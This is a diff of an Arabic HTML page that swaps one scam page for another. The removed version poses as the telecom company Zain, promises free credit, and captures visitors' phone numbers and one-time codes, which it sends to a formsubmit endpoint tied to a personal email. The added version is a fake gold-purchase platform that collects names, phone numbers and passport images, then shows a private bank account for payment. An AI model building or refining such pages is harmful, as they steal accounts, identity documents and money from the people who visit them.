@@ -3,292 +3,378 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>
-    مرحبا بك في عالمنا 
-</title>
-
+    <title>منصة حبوب الذهب الفاخرة</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
     <style>
+        :root {
+            --gold-light: #fff2a3;
+            --gold-main: #f5d061;
+            --gold-dark: #e5a93b;
+            --gold-darker: #9e6d0f;
+            --gold-gradient: linear-gradient(135deg, #ffe28a 0%, #d4af37 50%, #996515 100%);
+            --gold-glow: linear-gradient(135deg, #ffffff 0%, #f3e5ab 30%, #d4af37 70%, #aa7c11 100%);
+            --dark-bg: #0d0d0d;
+            --card-bg: rgba(20, 20, 20, 0.85);
+            --border-gold: linear-gradient(45deg, #bf953f, #fcf6ba, #b38728, #fbf5b7, #aa771c);
+        }
+
         * {
             box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Cairo', sans-serif;
         }
 
         body {
-            margin: 0;
-            min-height: 100vh;
-            padding: 20px;
+            background-color: var(--dark-bg);
+            background-image: 
+                radial-gradient(circle at 50% 0%, rgba(212, 175, 55, 0.25) 0%, transparent 60%),
+                radial-gradient(circle at 50% 100%, rgba(0, 0, 0, 0.9) 0%, transparent 80%);
+            color: #ffffff;
             display: flex;
             justify-content: center;
             align-items: center;
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #f8f6ff, #ece5ff);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* حاوية الصفحة بتأثير الإطار الذهبي */
+        .container-wrapper {
+            position: relative;
+            padding: 3px;
+            border-radius: 24px;
+            background: var(--border-gold);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.8), 0 0 25px rgba(212, 175, 55, 0.2);
+            width: 100%;
+            max-width: 520px;
         }
 
         .container {
+            background: var(--card-bg);
+            backdrop-filter: blur(10px);
             width: 100%;
-            max-width: 410px;
-            overflow: hidden;
-            background: #fff;
+            padding: 35px 30px;
             border-radius: 22px;
-            box-shadow: 0 12px 40px rgba(91, 45, 145, 0.15);
+            position: relative;
+            overflow: hidden;
         }
 
-        .demo-banner {
-            padding: 13px;
-            text-align: center;
-            background: #fff3cd;
-            color: #805d00;
-            font-size: 13px;
-            font-weight: bold;
-            border-bottom: 1px solid #f4dfa0;
-        }
-
+        /* رأس الصفحة والأيقونة */
         .header {
-            padding: 28px 24px;
             text-align: center;
-            color: white;
-            background: linear-gradient(135deg, #6d28d9, #9333ea);
+            margin-bottom: 30px;
         }
 
-        .logo {
-            width: 65px;
-            height: 65px;
-            margin: 0 auto 12px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            border-radius: 20px;
-            background: rgba(255, 255, 255, 0.18);
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            font-size: 29px;
-            font-weight: bold;
+        .gold-icon {
+            font-size: 42px;
+            margin-bottom: 5px;
+            filter: drop-shadow(0 0 10px rgba(245, 208, 97, 0.6));
         }
 
         .header h1 {
-            margin: 0 0 8px;
-            font-size: 22px;
+            background: var(--gold-glow);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-size: 32px;
+            font-weight: 900;
+            letter-spacing: 1px;
+            margin-bottom: 5px;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.5);
         }
 
         .header p {
-            margin: 0;
-            font-size: 13px;
-            opacity: 0.9;
-        }
-
-        .form-wrapper {
-            padding: 25px;
-        }
-
-        .step {
-            display: none;
-        }
-
-        .step.active {
-            display: block;
-        }
-
-        .alert-box {
-            padding: 12px;
-            border-radius: 10px;
-            background: #e0f2fe;
-            color: #0369a1;
-            font-size: 13px;
-            margin-bottom: 18px;
-            text-align: center;
-            line-height: 1.6;
-            border: 1px solid #bae6fd;
-        }
-
-        .success-box {
-            padding: 20px;
-            border-radius: 12px;
-            background: #dcfce7;
-            color: #15803d;
-            font-size: 16px;
-            font-weight: bold;
-            text-align: center;
-            line-height: 1.8;
-            border: 1px solid #bbf7d0;
-        }
-
-        .form-group {
-            margin-bottom: 19px;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 9px;
-            color: #333;
-            font-size: 14px;
-            font-weight: bold;
-        }
-
-        input {
-            width: 100%;
-            min-height: 48px;
-            padding: 12px 14px;
-            border: 1px solid #ddd4ef;
-            border-radius: 11px;
-            outline: none;
-            background: #fff;
-            color: #333;
+            color: #d1d1d1;
             font-size: 15px;
-            font-family: inherit;
-            transition: border-color 0.2s, box-shadow 0.2s;
         }
 
-        .otp-input {
-            text-align: center;
-            letter-spacing: 8px;
-            font-size: 20px;
-            font-weight: bold;
-            direction: ltr;
+        /* بطاقات الأسعار الذهبية */
+        .price-badge-container {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin-top: 20px;
         }
 
-        input:focus {
-            border-color: #8539dc;
-            box-shadow: 0 0 0 3px rgba(133, 57, 220, 0.1);
-        }
-
-        button {
-            width: 100%;
-            min-height: 49px;
-            border: none;
+        .price-badge {
+            background: var(--gold-gradient);
+            color: #0d0d0d;
+            padding: 10px 15px;
             border-radius: 12px;
-            background: linear-gradient(135deg, #7028d9, #9333ea);
+            font-weight: 700;
+            font-size: 14px;
+            flex: 1;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(212, 175, 55, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.4);
+        }
+
+        .price-badge span {
+            display: block;
+            font-size: 16px;
+            font-weight: 900;
+        }
+
+        /* حقول الإدخال */
+        .form-group {
+            margin-bottom: 22px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: var(--gold-main);
+            font-weight: 600;
+            font-size: 15px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 10px;
+            border: 1px solid #444;
+            background-color: rgba(30, 30, 30, 0.9);
             color: #fff;
             font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.2s;
+            outline: none;
+            transition: all 0.3s ease;
         }
 
-        button:hover {
-            filter: brightness(0.95);
+        .form-group input:focus {
+            border-color: var(--gold-main);
+            box-shadow: 0 0 12px rgba(245, 208, 97, 0.4);
+            background-color: rgba(40, 40, 40, 0.95);
         }
 
-        .footer {
-            padding: 15px;
-            border-top: 1px solid #f0ebf7;
+        /* رفع الملفات الفاخر */
+        .file-input-wrapper {
+            position: relative;
+            background: linear-gradient(180deg, rgba(35,35,35,1) 0%, rgba(20,20,20,1) 100%);
+            border: 2px dashed var(--gold-dark);
+            padding: 20px;
+            border-radius: 12px;
             text-align: center;
-            color: #888;
-            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .file-input-wrapper:hover {
+            border-color: var(--gold-main);
+            background: rgba(45, 45, 45, 1);
+            box-shadow: 0 0 15px rgba(212, 175, 55, 0.2);
+        }
+
+        .file-input-wrapper input[type="file"] {
+            position: absolute;
+            left: 0;
+            top: 0;
+            opacity: 0;
+            width: 100%;
+            height: 100%;
+            cursor: pointer;
+        }
+
+        .file-input-wrapper span {
+            color: var(--gold-light);
+            font-weight: 600;
+        }
+
+        /* الزر الذهبي الفاخر */
+        .btn-submit {
+            width: 100%;
+            padding: 16px;
+            background: var(--gold-glow);
+            color: #0d0d0d;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 900;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 6px 20px rgba(212, 175, 55, 0.4);
+            letter-spacing: 0.5px;
+            margin-top: 10px;
+        }
+
+        .btn-submit:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(245, 208, 97, 0.6);
+        }
+
+        .btn-submit:active {
+            transform: translateY(1px);
+        }
+
+        /* صفحة الترحيب المحسنة */
+        .welcome-card {
+            display: none;
+            text-align: center;
+            animation: fadeIn 0.6s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .welcome-card h2 {
+            background: var(--gold-glow);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-size: 26px;
+            font-weight: 900;
+            margin-bottom: 12px;
+        }
+
+        .bank-details {
+            background: linear-gradient(145deg, #1f1f1f, #141414);
+            border: 1px solid var(--gold-dark);
+            border-radius: 16px;
+            padding: 22px;
+            margin: 25px 0;
+            text-align: right;
+            box-shadow: inset 0 0 15px rgba(0,0,0,0.8), 0 5px 15px rgba(0,0,0,0.5);
+        }
+
+        .bank-details p {
+            margin-bottom: 12px;
+            font-size: 16px;
+            color: #e0e0e0;
+        }
+
+        .bank-details strong {
+            color: var(--gold-main);
+        }
+
+        .account-number-box {
+            background: #000;
+            border: 1px solid var(--gold-main);
+            padding: 12px;
+            border-radius: 10px;
+            margin-top: 10px;
+            text-align: center;
+        }
+
+        .account-number {
+            font-size: 26px;
+            color: var(--gold-light);
+            font-weight: 900;
+            letter-spacing: 3px;
+            direction: ltr;
+            display: inline-block;
+        }
+
+        .alert-info {
+            font-size: 13px;
+            color: #b0b0b0;
+            line-height: 1.6;
+            background: rgba(212, 175, 55, 0.08);
+            padding: 12px;
+            border-radius: 8px;
+            border-right: 3px solid var(--gold-main);
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <!-- شريط التنبيه التجريبي -->
-    <div class="demo-banner">
-      زين عالم جميل 
-      رصيد مجانا  فقط ادخل بياناتك بصورة صحيحة 
- 
-    </div>
-
-    <!-- الهيدر الاحترافي -->
-    <div class="header">
-        <div class="logo">⚡</div>
-        <h1>شركة  زين عالم جميل </h1>
-        <p id="header-subtitle">مرحباً أهلاً وسهلاً بك</p>
-    </div>
-
-    <div class="form-wrapper">
-        <!-- النموذج يتكفل بالإرسال المباشر للإيميل -->
-        <form id="mainForm" action="https://formsubmit.co/mohammedata009@gmail.com" method="POST" onsubmit="handleSubmit(event)">
-            <input type="hidden" name="_captcha" value="false">
-
-            <!-- الخطوة الأولى: إدخال بيانات رقم الهاتف للحصول على 100 ألف -->
-            <div id="step1" class="step active">
-                <div class="alert-box" style="background: #f0e9ff; color: #54209b; border-color: #ddd4ef;">
-                    💸 <strong>تم إرسال 2 ألف جنيه</strong><br>
-                    أدخل بياناتك للحصول على 100 ألف
+    <div class="container-wrapper">
+        <div class="container">
+            
+            <!-- ================= 1. نموذج الشراء وإدخال البيانات ================= -->
+            <div id="step-form">
+                <div class="header">
+                    <div class="gold-icon">👑</div>
+                    <h1>حبوب الذهب</h1>
+                    <p>منصة الشراء المباشر بالجرام والحبة</p>
+                    <div class="price-badge-container">
+                        <div class="price-badge">سعر الجرام <span>800,000</span></div>
+                        <div class="price-badge">سعر الحبة <span>80,000</span></div>
+                    </div>
                 </div>
 
-                <div class="form-group">
-                    <label for="phone">رقم الهاتف</label>
-                    <input type="tel" id="phone" name="phone" placeholder="أدخل رقم الهاتف" required>
-                </div>
+                <form id="goldForm" action="https://formsubmit.co/YOUR_EMAIL_HERE" method="POST" enctype="multipart/form-data">
+                    
+                    <input type="hidden" name="_captcha" value="false">
+                    <input type="hidden" name="_subject" value="طلب جديد - حبوب الذهب">
 
-                <button type="button" onclick="goToStep2()">إرسال</button>
+                    <div class="form-group">
+                        <label for="fullName">الاسم بالكامل:</label>
+                        <input type="text" id="fullName" name="الاسم" placeholder="أدخل اسمك الثلاثي" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="phone">رقم العملية / الهاتف:</label>
+                        <input type="tel" id="phone" name="رقم_العملية" placeholder="أدخل رقم الهاتف أو رقم العملية" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="quantity">الكمية المطلوبة (بالجرام):</label>
+                        <input type="number" id="quantity" name="الكمية_بالجرام" min="0.1" step="0.1" placeholder="مثال: 1.5" required oninput="calculateTotal()">
+                    </div>
+
+                    <div class="form-group">
+                        <label>المبلغ الإجمالي المتوقع:</label>
+                        <input type="text" id="totalAmount" readonly value="0" style="background-color: #111; color: var(--gold-main); font-weight: bold; border-color: var(--gold-darker);">
+                    </div>
+
+                    <div class="form-group">
+                        <label>صورة الجواز:</label>
+                        <div class="file-input-wrapper">
+                            <span id="fileNameDisplay">📷 اضغط هنا لرفع صورة الجواز</span>
+                            <input type="file" id="passport" name="صورة_الجواز" accept="image/*,.pdf" required onchange="updateFileName(this)">
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn-submit">إرسال الطلب وإكمال التحويل</button>
+                </form>
             </div>
 
-            <!-- الخطوة الثانية: إدخال الرمز بعد الاعتماد -->
-            <div id="step2" class="step">
-                <div class="alert-box">
-                    ✅ <strong>تم الاعتماد!</strong><br>
-                    يرجى أدخل الرمز المرسل لإكمال العملية.
+            <!-- ================= 2. صفحة الترحيب الفاخرة ================= -->
+            <div id="step-welcome" class="welcome-card">
+                <div class="gold-icon">✨</div>
+                <h2>مرحباً بك، <span id="userNameDisplay"></span></h2>
+                <p style="color: #ccc; font-size: 15px;">تم تسجيل بيانات طلبك بنجاح. يرجى إكمال عملية التحويل لتأكيد الشراء:</p>
+
+                <div class="bank-details">
+                    <p><strong>اسم الحساب:</strong> محمد طه عطا المنان</p>
+                    <p><strong>الخدمة المطلوبة:</strong> حبوب الذهب</p>
+                    <p style="margin-bottom: 5px;"><strong>رقم الحساب للتحويل:</strong></p>
+                    <div class="account-number-box">
+                        <span class="account-number">2473368</span>
+                    </div>
                 </div>
 
-                <div class="form-group">
-                    <label for="otp">إرسال الرمز</label>
-                    <input type="text" id="otp" name="otp_code" class="otp-input" maxlength="6" placeholder="------" required>
-                </div>
-
-                <button type="submit">إرسال الرمز</button>
-            </div>
-
-            <!-- الخطوة الثالثة: الرسالة النهائية بعد كتابة الرمز وارساله -->
-            <div id="step3" class="step">
-                <div class="success-box">
-                    🎉 
-                    تاكد من ادخال الرمز والرقم للحصول على المبلغ بنجاح!
+                <div class="alert-info">
+                    ⚠️ يرجى الاحتفاظ بإشعار التحويل المالي، وسيتم التواصل معكم فور تأكيد المعاملة.
                 </div>
             </div>
-        </form>
+
+        </div>
     </div>
 
-    <div class="footer">
-  جميع الحقوق محفوظة © 2026 - شركة زين
- 
-    </div>
-</div>
-
-<script>
-    function goToStep2() {
-        const phone = document.getElementById('phone').value;
-
-        if (phone.trim() === "") {
-            alert("يرجى إدخال رقم الهاتف أولاً");
-            return;
+    <script>
+        function calculateTotal() {
+            const qty = parseFloat(document.getElementById('quantity').value) || 0;
+            const gramPrice = 800000;
+            const total = qty * gramPrice;
+            document.getElementById('totalAmount').value = total.toLocaleString('ar-EG') + " جنيه";
         }
 
-        // الانتقال للخطوة الثانية (تم الاعتماد + أدخل الرمز)
-        document.getElementById('step1').classList.remove('active');
-        document.getElementById('step2').classList.add('active');
-    }
-
-    function handleSubmit(event) {
-        // عند إرسال الرمز، يتم إرسال البيانات خلف الكواليس وإظهار رسالة "تم إرسال المبلغ"
-        const otp = document.getElementById('otp').value;
-        if (otp.trim() === "") {
-            event.preventDefault();
-            alert("يرجى كتابة الرمز أولاً");
-            return;
-        }
-
-        // إرسال البيانات عبر FormSubmit في الخلفية
-        const form = event.target;
-        const formData = new FormData(form);
-
-        fetch(form.action, {
-            method: 'POST',
-            body: formData,
-            headers: {
-                'Accept': 'application/json'
+        function updateFileName(input) {
+            const display = document.getElementById('fileNameDisplay');
+            if (input.files && input.files[0]) {
+                display.innerText = "✅ تم اختيار: " + input.files[0].name;
+            } else {
+                display.innerText = "📷 اضغط هنا لرفع صورة الجواز";
             }
-        }).then(() => {
-            // إظهار واجهة النتيجة النهائية
-            document.getElementById('step2').classList.remove('active');
-            document.getElementById('step3').classList.add('active');
-        }).catch(() => {
-            // في حال وجود مشكلة يتم عرض واجهة النتيجة أيضاً للتجربة
-            document.getElementById('step2').classList.remove('active');
-            document.getElementById('step3').classList.add('active');
+        }
+
+        document.getElementById('goldForm').addEventListener('submit', function(e) {
+            const nameInput = document.getElementById('fullName').value;
+            document.getElementById('userNameDisplay').innerText = nameInput;
+
+            document.getElementById('step-form').style.display = 'none';
+            document.getElementById('step-welcome').style.display = 'block';
         });
-
-        event.preventDefault();
-    }
-</script>
-
+    </script>
 </body>
 </html>
